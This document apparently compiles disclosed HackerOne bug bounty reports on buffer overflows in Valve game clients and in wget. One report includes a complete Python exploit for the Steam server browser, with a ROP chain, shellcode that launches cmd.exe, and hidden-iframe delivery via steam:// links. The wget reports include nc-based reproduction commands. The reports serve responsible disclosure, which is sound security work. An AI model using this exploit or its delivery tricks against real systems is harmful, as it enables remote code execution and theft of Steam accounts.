### [Malformed NAV file leads to buffer overflow and code execution in Left4Dead2.exe](https://hackerone.com/reports/542180)

- **Report ID:** `542180`
- **Severity:** Critical
- **Weakness:** Classic Buffer Overflow
- **Program:** Valve
- **Reporter:** @hunterstanton
- **Bounty:** 10000 usd
- **Disclosed:** 2020-03-25T22:00:16.031Z
- **CVE(s):** -

**Vulnerability Information:**

## Summary
In the parsing routines of NAV files (which contain the navigation mesh used by the AI for survivor bots, zombies, and the AI director spawning system) a buffer overflow exists which can be used to control the EIP register and takeover code execution. 

## Proof-of-Concept
1. Download the attached c1m1_hotel.nav
2. Place it in your *<steamapps>/Left 4 Dead 2/left4dead2/maps/* directory
3. Start up Left4Dead 2 and attach a debugger
4. Enter "map c1m1_hotel" into the developer console
5. Observe that EIP becomes 0x41414102, indicating that a buffer overflow has occurred and code execution is possible

## Operating Systems Tested
- Windows 10 1809 Build 17763.437

I have not tried this for MacOS or Linux, however I assume it would work on both of those platforms as well if they all share the same codebase as the Windows executable.

## Notes
Because Left4Dead 2 ships on Windows with a non-ASLR enabled module (binkw32.dll), it is much easier to write up a working exploit for this vulnerability as you no longer need an additional infoleak of some kind to do serious damage and can just use ROP.

## Impact

## Impact
If an attacker successfully exploits this vulnerability, the attacker can run arbitrary code on the machine of a victim.

Due to the fact that Source supports sending arbitrary files to clients when connecting to a server, it is possible that you could create a fake dedicated server that does nothing but send the malformed NAV file to clients who are connecting, creating a remote code execution scenario.

Another attack scenario would be an attacker uploading a campaign map with a malformed NAV to the Steam Workshop, and convincing other users to download it. When they download it and load the campaign in game, arbitrary code will be executed on their machines.

---

### [Malformed .BMP file in Counter-Strike 1.6 may cause shellcode injection](https://hackerone.com/reports/397545)

- **Report ID:** `397545`
- **Severity:** High
- **Weakness:** Classic Buffer Overflow
- **Program:** Valve
- **Reporter:** @kohtep2010
- **Bounty:** - usd
- **Disclosed:** 2020-02-27T18:43:10.663Z
- **CVE(s):** -

**Vulnerability Information:**

With the vulnerability of the GoldSource Engine, the server is able to perform remote code execution on the client, overwriting the stack when reading the BMP file. The problem is in the LoadBMP8 function, which is executed when the player connects to the server, by loading the "overviews\%MAPNAME%.bmp" file. If we send a badly formed file to this function, then we will be able to rewrite the stack of the function by setting the own code in the stack and passing program control to it.

I've wrote a program that compiles file like that. The shellcode, which runs on the stack, starts the "calc.exe" process with the WinExec function.

For the client to execute this file, the server must send this file to the client. The server can do this if map that is not present on the client is launched. The server must load a map with random name, for example, "definitely_missing_client_map.bsp". In this case, the name of the BMP file must also be "definitely_missing_client_map.bmp" and it must be in "overviews" folder. You also must create the "overviews\definitely_missing_client_map.txt" file, which is overview description. The nonstandard name of the map prompts the client to download the missing files (bsp, bmp and txt). Upon completion, when the client is able to see the map, the BMP file will be loaded and the binary code from BMP file will be executed on the stack.

I've attached the source code of "compiler" to the message. You can find more detailed instructions in the code comments. You need to compile this project in "Release" configuration and then start this project. After that, malformed "de_dust2.bmp" file will be produced.

## Impact

An attacker can execute remote code on the client's machine.

---

### [CVE-2017-13089 wget stack smash](https://hackerone.com/reports/287666)

- **Report ID:** `287666`
- **Severity:** High
- **Weakness:** Classic Buffer Overflow
- **Program:** Internet Bug Bounty
- **Reporter:** @jalio
- **Bounty:** - usd
- **Disclosed:** 2019-11-12T23:45:43.577Z
- **CVE(s):** CVE-2017-13089

**Vulnerability Information:**

The http.c:skip_short_body() function is called in some circumstances, such as when processing redirects. When the response is sent chunked in wget before 1.19.2, the chunk parser uses strtol() to read each chunk's length, but doesn't check that the chunk length is a non-negative number. The code then tries to skip the chunk in pieces of 512 bytes by using the MIN() macro, but ends up passing the negative chunk length to connect.c:fd_read(). As fd_read() takes an int argument, the high 32 bits of the chunk length are discarded, leaving fd_read() with a completely attacker controlled length argument.

Reproduction:
To reproduce, use two terminals.  In the first terminal:
$ nc -l -p 8080 <wget-stack-smash.reply
In the second terminal:
$ wget http://127.0.0.1:8080/foo

Depending on how wget is compiled, this will either simply segfault or
complain about the stack being smashed (on debian due to being compiled
the stack protector.)

External links:
https://nvd.nist.gov/vuln/detail/CVE-2017-13089
http://www.securityfocus.com/bid/101592
http://git.savannah.gnu.org/cgit/wget.git/commit/?id=d892291fb8ace4c3b734ea5125770989c215df3f
http://www.securitytracker.com/id/1039661
https://www.viestintavirasto.fi/en/cybersecurity/vulnerabilities/2017/haavoittuvuus-2017-037.html

---

### [CVE-2017-13090 wget heap smash](https://hackerone.com/reports/287667)

- **Report ID:** `287667`
- **Severity:** High
- **Weakness:** Classic Buffer Overflow
- **Program:** Internet Bug Bounty
- **Reporter:** @jalio
- **Bounty:** - usd
- **Disclosed:** 2019-11-12T23:45:27.217Z
- **CVE(s):** CVE-2017-13090

**Vulnerability Information:**

The retr.c:fd_read_body() function is called when processing OK responses. When the response is sent chunked in wget before 1.19.2, the chunk parser uses strtol() to read each chunk's length, but doesn't check that the chunk length is a non-negative number. The code then tries to read the chunk in pieces of 8192 bytes by using the MIN() macro, but ends up passing the negative chunk length to retr.c:fd_read(). As fd_read() takes an int argument, the high 32 bits of the chunk length are discarded, leaving fd_read() with a completely attacker controlled length argument. The attacker can corrupt malloc metadata after the allocated buffer.

Reproduction
To reproduce, use two terminals.  In the first terminal:
$ nc -l -p 8080 <wget-heap-smash.reply
In the second terminal:
$ wget http://127.0.0.1:8080/foo

Depending on how wget is compiled, this will either simply segfault or
complain about the heap being corrupted.

External Links
https://nvd.nist.gov/vuln/detail/CVE-2017-13090
http://git.savannah.gnu.org/cgit/wget.git/commit?id=ba6b44f6745b14dce414761a8e4b35d31b176bba
http://www.debian.org/security/2017/dsa-4008
http://www.securityfocus.com/bid/101590
http://www.securitytracker.com/id/1039661
https://www.viestintavirasto.fi/en/cybersecurity/vulnerabilities/2017/haavoittuvuus-2017-037.html

---

### [RCE on Steam Client via buffer overflow in Server Info](https://hackerone.com/reports/470520)

- **Report ID:** `470520`
- **Severity:** Critical
- **Weakness:** Classic Buffer Overflow
- **Program:** Valve
- **Reporter:** @vinnievan
- **Bounty:** - usd
- **Disclosed:** 2019-03-15T19:47:43.463Z
- **CVE(s):** -

**Vulnerability Information:**

## Introduction

In Steam and other valve games (CSGO, Half-Life, TF2) there is a functionality to find game servers called the server browser. In order to retrieve the information about these servers the server browser communicates with a specific UDP protocol called [server queries](https://developer.valvesoftware.com/wiki/Server_queries). The protocol is well described in the online developers manual of Steam. We implemented a custom python server which only replies with the protocol using the same information available in the documentation. After a successful implementation of the protocol we fuzzed several parameters and noticed that the Steam client crashed when receiving replies from our custom server. More specifically, the client crashed when we replied with a large player name used in the `A2S_PLAYER` response. When attaching a debugger we noticed it crashed due to a stack-based buffer overflow.

This clearly indicates that something was wrong and we investigated it further to be able to exploit the buffer overflow. After further inspection, we noticed that the overflow occurred in the `serverbrowser` library. At some point the players’ name is converted into unicode and an overflow occurs because the boundaries are not checked. Also, there’s no canary protection present, which allowed us to overwrite the return address and execute arbitrary code on Windows.

## Exploit details

We wanted to prove impact and build an exploit. First, we tested it on Linux and we were able to control the execution flow instantly by overwriting the return address. However, on Linux, we were able to control two bytes of the `EIP` register only (e.g. `0x00004141`) and we didn’t explore it further. On OSX, the process terminated with `SIGABRT`, which means that there’s probably a canary protection in the library on OSX. Then, we tried to exploit it on Windows and we were successful (tested on Windows 8.1 and 10).

On Windows, sending a player name via UDP like `A*1100` would result in the following stack layout:
```
0x00410041
0x00410041
...
```

This happens due to unicode conversion (wide-char), because player names can use unicode characters. Sending a player name with unicode characters like `u"\u4141"*1100` would result in the following layout:
```
0x41414141
0x41414141
...
```

However, since we were corrupting the stack and registers before the function returns, we had no control over the `EIP` register yet. The program was crashing after dereferencing the `edi` register, but we had control over it. We satisfied these special conditions using constant values present on the `Steam.exe` binary:

{F395516}

Then, we built a unicode ROP chain with gadgets from `Steam.exe` only, to call `VirtualProtect` dynamically to make the stack executable and jump to our unicode shellcode to execute `cmd.exe`. This was a big challenge since we couldn't use values like `0x00000040` in our ROP chain, otherwise the string would be terminated. And we couldn't use invalid unicode characters like `u"\uda01"` because the library replaces them with a question mark `?` - `0x003F`.

**Note:** Everything is calculated using the `Steam.exe` base address. This address changes if you restart your Windows 8 or Windows 10, not if you relaunch Steam. The exploit is 100% reliable if you edit the base address on the exploit, but you can't predict the base address in the computer of a victim due to ASLR. However, we have two exploitation scenarios:

- Only 9 bits are randomized: An attacker can successfully exploit a victim with a probability of 0.2% (1/512), which is more than enough if we are talking about an attacker distributing this exploit massively to all Steam users (1 new victim every 512 attempts in average)
- This vulnerability can be chained with another memory leak vulnerability to make it 100% reliable

## Steps to reproduce

First, make sure that you have Steam installed. If you are using the beta version, please uncomment the beta version gadgets in the exploit code.

1 - Download the attachment: {F395515}
2 - Use a debugger like Immunity Debugger and attach to Steam.exe
3 - Grab the base address of `Steam.exe` (View > Executable modules) and edit the `STEAM_BASE` variable on `steam_serverinfo_exploit.py` to make the exploit 100% reliable
{F395520}

4 - Run the exploit on a server of your choice (e.g. localhost): `python steam_serverinfo_exploit.py`
5 - Edit `POC.html` and change the IP address of the server in the `iframe src`
6 - Open it in a browser and wait for `cmd.exe` to be executed
7 - You can also open the server browser in the menu (View > Servers) and click `View server info` to trigger the exploit (if you are running the server in the same network it will appear in the LAN section)

## PoC

{F395517}
**Steamclient_POC_Windows10.mp4**: Contains a video of the exploit being triggered on Windows 10 via manual interaction with the Steam server browser

{F395518}
**SteamURL_POC_Windows10.mp4**: Contains a video of the exploit being triggered on Windows 10 via a malicious web page containing a hidden iframe that will trigger the exploit automatically. In the video, Steam was not running when visiting the malicious page and it was automatically started. This also works when Steam is already running.

{F395519}
Contains the html page code used in the SteamURL video.

**Exploit code:**

```python
import logging
import socket
import textwrap


### Exploit for Server Info - Player Name buffer overflow (Steam.exe - Windows 8 and 10) #######
# More info: https://developer.valvesoftware.com/wiki/Server_queries
# Shellcode must contain valid unicode characters, pad with NOPs :)


STEAM_BASE = 0x01180000

# Shellcode: open cmd.exe
shellcode = "\x31\xc9\x64\x8b\x41\x30\x8b\x40\x0c\x8b\x70\x14\xad\x96\xad\x8b\x58\x10\x8b\x53\x3c\x01\xda\x90\x8b\x52\x78\x01\xda\x8b\x72\x20\x90\x01\xde\x31\xc9\x41\xad\x01\xd8\x81\x38\x47\x65\x74\x50\x75\xf4\x81\x78\x04\x72\x6f\x63\x41\x75\xeb\x81\x78\x08\x64\x64\x72\x65\x75\xe2\x8b\x72\x24\x90\x01\xde\x66\x8b\x0c\x4e\x49\x8b\x72\x1c\x01\xde\x8b\x14\x8e\x90\x01\xda\x31\xf6\x89\xd6\x31\xff\x89\xdf\x31\xc9\x51\x68\x61\x72\x79\x41\x68\x4c\x69\x62\x72\x68\x4c\x6f\x61\x64\x54\x53\xff\xd2\x83\xc4\x0c\x31\xc9\x68\x65\x73\x73\x42\x88\x4c\x24\x03\x68\x50\x72\x6f\x63\x68\x45\x78\x69\x74\x54\x57\x31\xff\x89\xc7\xff\xd6\x83\xc4\x0c\x31\xc9\x51\x68\x64\x6c\x6c\x41\x88\x4c\x24\x03\x68\x6c\x33\x32\x2e\x68\x73\x68\x65\x6c\x54\x31\xd2\x89\xfa\x89\xc7\xff\xd2\x83\xc4\x0b\x31\xc9\x68\x41\x42\x42\x42\x88\x4c\x24\x01\x68\x63\x75\x74\x65\x68\x6c\x45\x78\x65\x68\x53\x68\x65\x6c\x54\x50\xff\xd6\x83\xc4\x0d\x31\xc9\x68\x65\x78\x65\x41\x88\x4c\x24\x03\x68\x63\x6d\x64\x2e\x54\x59\x31\xd2\x42\x52\x31\xd2\x52\x52\x51\x52\x52\xff\xd0\xff\xd7"


def udp_server(host="0.0.0.0", port=27015):
    s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    s.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
    print("[*] Starting TSQuery UDP server on host: %s and port: %s" % (host, port))
    s.bind((host, port))
    while True:
        (data, addr) = s.recvfrom(128*1024)
        requestType = checkRequestType(data)
        if requestType == "INFO":
            response = createINFOReply()
        elif requestType == "PLAYER":
            response = createPLAYERReply()
            print("[+] Payload sent!")
        else:
            response = 'nope'
        s.sendto(response,addr)
        yield data


def checkRequestType(data):
    # Header byte contains the type of request
    header = data[4]
    if header == "\x54":
        print("[*] Received A2S_INFO request")
        return "INFO"
    elif header == "\x55":
        print("[*] Received A2S_PLAYER request")
        return "PLAYER"
    else:
        print "Unknown request"
        return "UNKNOWN"


def createINFOReply():
    # A2S_INFO response
    # Retrieves information about the server including, but not limited to: its name, the map currently being played, and the number of players.
    pre = "\xFF\xFF\xFF\xFF"                         # Pre (4 bytes)
    header = "\x49"                                  # Header (1 byte)
    protocol = "\x02"                                # Protocol version (1 byte)
    name = "@Kernelpanic and @0xacb Server" + "\x00" # Server name (string)
    map_name = "de_dust2" + "\x00" # Map name (string)
    folder = "csgo" + "\x00" # Name of the folder contianing the game files (string)
    game = "Counter-Strike: Global Offensive" + "\x00" # Game name (string)
    ID = "\xda\x02" # Game ID (short)
    players = "\xFF" # Amount of players in the server (byte)
    maxplayers = "\xFF" # Max player allowed (byte)
    bots = "\x00" # Bots in game (byte)
    server_type = "d" # Server type, d = dedicate (byte)
    environment = "l" # Hosted on windows linux or mac, l is linux (byte)
    visibility = "\x00" # Password needed? (byte)
    VAC = "\x01" # VAC enabled? (byte)
    version = "1.3.6.7.1\x00"
    return pre + header + protocol + name + map_name + folder + game + ID + players + maxplayers + bots + server_type + environment + visibility + VAC + version


def to_unicode(addr):
    a = addr & 0xffff;
    b = addr >> 16;
    return eval('u"\\u%s\\u%s"' % (hex(a)[2:].zfill(4), hex(b)[2:].zfill(4)))


def convert_addr(gadget):
    return to_unicode(STEAM_BASE + gadget - 0x400000)


def convert_shellcode(code):
    code = code + "\x90"*8 #pad with nops
    output = ""
    l = textwrap.wrap(code.encode("hex"), 2)
    for i in range(0, len(l)-4, 4):
        output += "\\u%s%s\\u%s%s" % (l[i+1], l[i], l[i+3], l[i+2])
    return eval('u"%s"' % output)


def pwn():
    print("[*] Building ROP chain")

    # ROP gadgets for Steam.exe Nov 26 2018
    pop_eax = convert_addr(0x503ca7)
    pop_ecx = convert_addr(0x41bd9f)
    pop_edx = convert_addr(0x413a53)
    pop_ebx = convert_addr(0x40511c)
    pop_ebp = convert_addr(0x40247c)
    pop_esi = convert_addr(0x404de6)
    pop_edi = convert_addr(0x423839)
    jmp_esp = convert_addr(0x4413bd)
    pushad = convert_addr(0x425e00)
    ret_nop = convert_addr(0x401212)
    mov_edx_eax = convert_addr(0x5599a6)
    sub_eax_41e82c6a = convert_addr(0x51584f)
    mov_ebx_ecx_mov_ecx_eax_mov_eax_esi_pop_esi_ret = convert_addr(0x4e24eb)
    mov_esi_ptr_esi_mov_eax_esi_pop_esi = convert_addr(0x4506ea)
    xchg_eax_esi = convert_addr(0x543b86)

    writable_addr = convert_addr(0x69a01c)
    virtual_protect_idata = convert_addr(0x5f9280)
    new_protect = to_unicode(0x41e82c6a+0x40)
    msize = to_unicode(0x41e82c6a+0x501)

    '''
    # ROP gadgets for Steam.exe Beta Dec 14 2018
    pop_eax = convert_addr(0x425993)
    pop_ecx = convert_addr(0x41bd9f)
    pop_edx = convert_addr(0x413a53)
    pop_ebx = convert_addr(0x40511c)
    pop_ebp = convert_addr(0x40247c)
    pop_esi = convert_addr(0x404de6)
    pop_edi = convert_addr(0x423839)
    jmp_esp = convert_addr(0x4413bd)
    pushad = convert_addr(0x425e00)
    ret_nop = convert_addr(0x401212)
    mov_edx_eax = convert_addr(0x559d46)
    sub_eax_31e82c6a = convert_addr(0x515bbf)
    mov_ebx_ecx_mov_ecx_eax_mov_eax_esi_pop_esi_ret = convert_addr(0x4e284b)
    mov_esi_ptr_esi_mov_eax_esi_pop_esi = convert_addr(0x4506ea)
    xchg_eax_esi = convert_addr(0x515b5e)

    writable_addr = convert_addr(0x69a01c)
    virtual_protect_idata = convert_addr(0x5fa280)
    new_protect = to_unicode(0x31e82c6a+0x40)
    msize = to_unicode(0x31e82c6a+0x501)
    '''

    rop = pop_eax + msize + sub_eax_41e82c6a + mov_ebx_ecx_mov_ecx_eax_mov_eax_esi_pop_esi_ret \
              + u"\ub33f\ubeef" + mov_ebx_ecx_mov_ecx_eax_mov_eax_esi_pop_esi_ret + ret_nop*0x10 \
              + pop_ecx + writable_addr \
              + pop_eax + new_protect + sub_eax_41e82c6a + mov_edx_eax \
              + pop_ebp + jmp_esp + pop_esi + virtual_protect_idata \
              + mov_esi_ptr_esi_mov_eax_esi_pop_esi + u"\ub33f\ubeef" + xchg_eax_esi + pop_edi \
              + ret_nop + pop_eax + u"\u9090\u9090" + pushad

    #special conditions to avoid crashes
    special_condition_1 = to_unicode(STEAM_BASE + 0x10)
    special_condition_2 = to_unicode(STEAM_BASE + 0x11)
    payload = "A"*1024 + u"\ub33f\ubeef"*12 + special_condition_1 + special_condition_2*31 + rop + shellcode
    return payload.encode("utf-8") + "\x00"


def createPLAYERReply():
    # A2S_player response
    # This query retrieves information about the players currently on the server.
    pre = "\xFF\xFF\xFF\xFF"                        # Pre (4 bytes)
    header = "\x44"                                 # Header (1 byte)
    players = "\x01"                                # Amount of players (1 byte)
    indexPlayer1 = "\x01"                           # Index of player (1 byte)

    namePlayer2 = pwn()
    scorePlayer2 = ""
    durationPlayer2  = ""
    return pre + header + players + indexPlayer1 + namePlayer2 + scorePlayer2 + durationPlayer2


FORMAT_CONS = '%(asctime)s %(name)-12s %(levelname)8s\t%(message)s'
logging.basicConfig(level=logging.DEBUG, format=FORMAT_CONS)

if __name__ == "__main__":
    shellcode = convert_shellcode(shellcode)
    for data in udp_server():
        pass
```

## Impact

An attacker can execute arbitrary code on the computer of any Steam user who views the server info of our malicious server. Usually an attacker would initiate a backdoor connection to a C2 infrastructure to gain access to the computer of the victim. From there on an attacker could do whatever he/she wants (e.g. account takeover, steal all items from the steam account, install additional malware in the OS, exfiltrate documents, etc.)

There are several ways to trick a user into running the exploit:
- User views the Server Info in the Steam client server browser
- User visits a malicious web page of an attacker where a [Steam browser protocol](https://developer.valvesoftware.com/wiki/Steam_browser_protocol) request is initiated: `steam://connect/1.2.3.4`

Additionally there are a few ways that increase the likelihood of this attack:
- It can be triggered via a website using the steam browser protocol
- Lots of users don’t need to click the `Open Steam` button on the browser (Always open these types of links in the associated app ✓)
- The first Info Reply that doesn’t contain the exploit can have interesting values to trick the user. 
  - The server name can be chosen and can trick the user to use the server
  - By setting the current amount of players high people are more likely to join
  - Map name could also contain interesting text as values to lure people
  - If the amount of players in the server is equal the maximum allowed players in the server then the server info box is automatically opened and the exploit executes successfully after the first automatic refresh

Best regards,
Vinnie Vanhoecke @vinnievan and André Baptista @0xacb

---

### [Malformed Skybox .TGA in Half-Life (GoldSRC) leads to Access Violation](https://hackerone.com/reports/351016)

- **Report ID:** `351016`
- **Severity:** High
- **Weakness:** Classic Buffer Overflow
- **Program:** Valve
- **Reporter:** @chippy
- **Bounty:** - usd
- **Disclosed:** 2018-08-28T23:37:17.517Z
- **CVE(s):** -

**Vulnerability Information:**

A malformed .TGA when loaded as a Skybox on a map in a GoldSRC engine game (Half-Life) can lead to arbitrary code execution on a remote client.

###Reproduction Steps

Load the attached map + resources on a local Half-Life listen server. The game will crash with an Access Violation as soon as the map with the malicious skybox is loaded.

###Exploitability

Since anyone can host a map with custom assets, and the custom assets are loaded onto a remote clients computer, a malicious server can distribute malformed skybox assets (.TGA's) that could cause remote code execution on clients. The inclusion of .DLL's on Steam without ASLR make exploitablility of this bug via ROP quite trivial.

## Impact

###Impact

A malicious server could infect hundreds or perhaps thousands of clients with this bug. This bug could also be used in targeted attacks for the theft / compromise of high-value Steam accounts by attacking their Half-Life client.

---

### [Malformed .BSP Access Violation in CS:GO can lead to Remote Code Execution](https://hackerone.com/reports/351014)

- **Report ID:** `351014`
- **Severity:** Critical
- **Weakness:** Classic Buffer Overflow
- **Program:** Valve
- **Reporter:** @chippy
- **Bounty:** - usd
- **Disclosed:** 2018-07-19T21:55:29.472Z
- **CVE(s):** -

**Vulnerability Information:**

A malformed .BSP can trigger an Access Violation on CS:GO that can lead to arbitrary code execution on a remote computer. I have attached a copy of the malformed .BSP which reliably triggers an Access Violation on CS:GO.

## Impact

An attacker hosting a malicious server could compromise a remote client by having them download a custom map, triggering remote code execution on the victim's computer.

---
